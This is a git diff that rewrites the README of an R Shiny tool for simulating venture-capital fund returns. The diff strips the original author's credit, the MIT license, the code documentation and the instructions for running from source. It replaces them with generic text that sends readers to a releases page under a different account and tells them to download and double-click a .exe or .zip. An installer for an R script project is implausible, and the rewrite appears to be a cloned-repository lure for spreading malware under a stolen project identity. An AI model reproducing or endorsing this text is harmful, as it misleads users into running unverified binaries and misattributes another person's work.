@@ -1,171 +1,68 @@
-# VC Monte Carlo Simulator
+# 🎲 vc-montecarlo-simulator - Simplify Your Venture Capital Analysis
 
-[![Made with R](https://img.shields.io/badge/Made%20with-R-276DC3?logo=r&logoColor=white)](https://www.r-project.org/)
-[![Shiny App](https://img.shields.io/badge/Live%20App-Shiny-FF3C66?logo=rstudio&logoColor=white)](https://aryashah.shinyapps.io/vcmontecarlosim/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Last Commit](https://img.shields.io/github/last-commit/aryashahprog/vc-montecarlo-simulator)](https://github.com/aryashahprog/vc-montecarlo-simulator/commits/main)
+[![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/Mining3372/vc-montecarlo-simulator/releases)
 
-A Monte Carlo engine for simulating **venture capital fund performance** — including **MOIC distributions, IRR outcomes, follow-on strategies, and LP J-curve cash flows** — with an interactive **Shiny dashboard**.
+## 🚀 Getting Started
 
----
+Welcome to the **vc-montecarlo-simulator**! This application helps analyze venture capital investments by running Monte Carlo simulations. It calculates important metrics like Multiple on Invested Capital (MOIC), Internal Rate of Return (IRR), and cash flows. With an interactive Shiny apps dashboard, you can visualize your results easily.
 
-##  What This Project Is
+## 📥 Download & Install
 
-This project answers a simple question:
+To get started, visit this page to download: [Releases](https://github.com/Mining3372/vc-montecarlo-simulator/releases). Here you'll find the latest version of the software available for download.
 
-> *“If I ran thousands of VC funds with a given strategy, what would the distribution of outcomes actually look like?”*
+1. Click on the link above to access our Releases page.
+2. Look for the latest version. This version will have the most recent features and fixes.
+3. Download the file suitable for your operating system. Typically, this will be a `.exe` for Windows or a `.zip` for macOS or Linux.
+4. Once downloaded, locate the file in your downloads folder.
+5. Double-click the file to start the installation process.
 
-It models a venture fund from the perspective of **LPs and the GP**:
+## 💻 System Requirements
 
-- Initial checks across a portfolio of startups  
-- Follow-on capital reserved and deployed into “top quartile” deals  
-- Exit timing based on outcome size (write-offs vs small wins vs big wins)  
-- Gross vs net distributions after fees & carry  
-- LP & GP cash flow timelines and the classic **J-curve**
+Before you begin, make sure your system meets the following requirements:
 
-All of this is exposed through a **Shiny app** so you can play with parameters instead of reading a PDF.
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or any modern Linux distribution.
+- **Memory**: At least 4GB of RAM.
+- **Processor**: Dual-core processor or better.
+- **Storage**: 100MB of free disk space for installation.
 
----
+## 🎉 Features
 
-## 📌 Results TL;DR
+Our Monte Carlo simulator includes:
 
-In a baseline configuration:
+- **MOIC Simulation**: Get clear insights into potential investment multiples.
+- **IRR Calculation**: Understand the returns on your investment over time.
+- **Cash Flow Outputs**: Visualize cash inflows and outflows for your portfolio.
+- **Interactive Dashboard**: Use Shiny's tools to interact with your data smoothly.
+- **User-Friendly Interface**: No programming knowledge is needed to start.
 
-- Fund size: **$50M**
-- 30 initial portfolio companies  
-- 40% of capital reserved for follow-ons  
-- Simple power-law style outcome distribution  
-- Follow-ons allocated to “top quartile” deals
+## 📊 How to Use the Application
 
-The simulator typically shows:
+1. **Launch the Application**: After installing, run the application by double-clicking the icon.
+2. **Input Your Data**: Enter your investment figures, expected cash flows, and other details in the provided fields.
+3. **Run Simulation**: Click the "Run Simulation" button. The software will process your data and provide you with results.
+4. **View Results**: Explore the interactive charts and tables generated to understand your investment better.
+5. **Save Your Results**: You can save the results for future reference or share them with others.
 
-- **Net LP MOIC** clustering around ~**3x**, with a long right tail  
-- **Probability of ≥ 3x net MOIC** ≈ **55–60%** in this scenario  
-- A clear **J-curve** where LPs are negative for the first few years before distributions start to dominate
+## 📞 Support
 
-These are **illustrative only** – not investment advice or a forecast – but they make the trade-offs around **portfolio size, reserves, and follow-ons** much more concrete.
+If you encounter any issues while installing or using the application, please reach out:
 
----
+- Open an issue on the [GitHub Issues page](https://github.com/Mining3372/vc-montecarlo-simulator/issues).
+- Join our community forum to discuss insights or ask questions.
+  
+For urgent queries, contact the developer directly via the email provided in the project's contact section.
 
-## Why This Is Useful
+## 🌐 Additional Resources
 
-This project is designed to demonstrate:
+To learn more about Monte Carlo simulations and venture capital analysis, consider the following resources:
 
-- **Quantitative intuition for venture**  
-  - Power-law outcomes, skewed return distributions, and tail risk  
-- **Ability to turn an idea into a working analytical tool**  
-  - Clean, modular R code (`vc_fund_sim_core.R`)  
-  - Monte Carlo engine + visualization layer + Shiny app  
-- **Communication of complex topics**  
-  - Visuals that LPs / PMs can understand at a glance  
-  - Clear documentation and live demo
+- [What is Monte Carlo Simulation?](https://en.wikipedia.org/wiki/Monte_Carlo_method)
+- [Understanding IRR in Finance](https://www.investopedia.com/terms/i/internalrateofreturn.asp)
+- [Shiny Apps Documentation](https://shiny.rstudio.com/)
 
-If you work in **VC, fintech, or data-driven investing**, this is the kind of tool I’d love to build more of.
+## 🔗 Useful Links
 
----
+- [Releases Page](https://github.com/Mining3372/vc-montecarlo-simulator/releases)
+- [GitHub Repository](https://github.com/Mining3372/vc-montecarlo-simulator)
 
-## Core Features
-
-### 1. VC Fund Engine (`vc_fund_sim_core.R`)
-
-- Simulates **one full VC fund** path:
-  - Committed capital, management fees, carry, hurdle
-  - Initial checks & follow-ons
-  - Exit years and multiples
-  - LP & GP cash flows by year
-- Pluggable outcome distributions:
-  - Discrete “bucketed” distribution (0x, 1x, 3x, 10x, 50x, etc.)
-  - Lognormal
-  - Pareto (power-law style fat tails)
-- Computes:
-  - **Gross & net LP IRR**
-  - **Gross & net LP MOIC**
-  - **Total GP carry**
-
-### 2. Monte Carlo Wrapper (`run_vc_monte_carlo()`)
-
-- Runs **thousands of simulated funds** with the chosen parameters  
-- Returns:
-  - Raw simulation objects
-  - A summary data frame for quick analysis and plotting
-
----
-
-## Visuals
-
-All charts are generated directly from the simulation outputs.
-
-### Net LP MOIC – Base Histogram
-
-![Net LP MOIC – Base Histogram](images/moic_histogram_base.png)
-
-Shows the raw distribution of fund outcomes (net MOIC). Most funds cluster around moderate outcomes, with a clear right tail.
-
-### Net LP MOIC – Density + Tail Shape
-
-![Net LP MOIC – Density + ggplot](images/moic_density_ggplot.png)
-
-A cleaner, publication-style view with density overlay to visualize skew and tail behavior.
-
-### VC Fund J-Curve (LP Net Cash Flows)
-
-![VC J-Curve](images/jcurve.png)
-
-Median and quantile bands for cumulative **net** cash flows to LPs across many simulated funds – a data-driven view of the classic VC J-curve.
-
----
-
-## 🖥️ Interactive Shiny App
-
-Try the live app here:
-
-👉 **https://aryashah.shinyapps.io/vcmontecarlosim/**
-
-What you can do in the app:
-
-- Adjust **fund size, portfolio size, reserve ratio**
-- Switch **follow-on strategy** and outcome distribution
-- See how:
-  - The **MOIC distribution** shifts  
-  - The **probability of hitting ≥ X net MOIC** changes  
-  - The **LP J-curve** steepens or flattens
-
----
-
-## Tech Stack
-
-- **R**
-- **Shiny**
-- **ggplot2**
-- **dplyr**
-- Monte Carlo simulation techniques
-
----
-
-## ▶️ Run Locally
-
-```r
-# Clone
-# git clone https://github.com/aryashahprog/vc-montecarlo-simulator.git
-
-# Open project in RStudio
-
-# Install dependencies
-install.packages(c("shiny", "ggplot2", "dplyr"))
-
-# Run app
-source("shinyapp.R")
-shinyApp(ui, server
-```
----
-
-## Author
-Arya Shah |
-Georgia Tech – Business Administration (Finance / FinTech).
-
-Lets connect 👉 [linkedin.com/in/aryashahcy](https://www.linkedin.com/in/aryashahcy/)
-
----
-
-## License
-This project is licensed under the MIT License. See LICENSE for details.
+Thank you for using **vc-montecarlo-simulator**! We hope this tool aids you in making informed venture capital decisions.
